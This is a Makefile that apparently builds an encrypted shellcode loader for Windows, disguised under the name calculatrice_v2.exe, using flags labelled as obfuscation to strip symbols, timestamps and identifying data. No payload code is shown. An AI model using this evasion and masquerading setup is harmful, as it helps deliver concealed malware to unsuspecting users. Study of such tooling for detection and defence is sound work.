CC = x86_64-w64-mingw32-gcc
CFLAGS = -Itemp -Wall -Wextra -O2 -mwindows -ffunction-sections -fdata-sections -fno-asynchronous-unwind-tables -fno-unwind-tables -fno-exceptions -fno-stack-protector -fno-stack-check -fno-strict-aliasing
WARNNIGS = -Wno-cast-function-type -Wno-unused-parameter -Wno-unused-variable -Wattributes
LIBS = -lmingw32 -lkernel32 -lntdll -luser32 -ladvapi32 -lshell32 -lmsvcrt  -lm -lgcc 
OBFUSCATION = -nostdlib -nodefaultlibs -s -fvisibility=hidden -fno-inline -fno-builtin -fno-ident
LDFLAGS = -Wl,--gc-sections,--entry=WinMainCRTStartup,--disable-auto-import,--no-insert-timestamp,--strip-all

SHELLCODE=asm/shellcode.nasm
SRC = temp/loader.c temp/decrypt.c #temp/WinAPI.c
ENTRYPOINT = src/crt_stub.c
HEADERS = temp/config.h
EXE = bin/calculatrice_v2.exe


.PHONY: all clean pre-build

all: pre-build $(EXE)

pre-build:
	@mkdir -p bin build temp
	@cp src/* temp/
	@cp asm/* temp/
	@python3 main.py

$(EXE): $(SRC) $(HEADERS)
	$(CC) $(CFLAGS) $(WARNNIGS) $(SRC) $(ENTRYPOINT) -static -static-libgcc -o $@ $(LDFLAGS) $(LIBS) $(OBFUSCATION)

clean:
	rm -rf bin build temp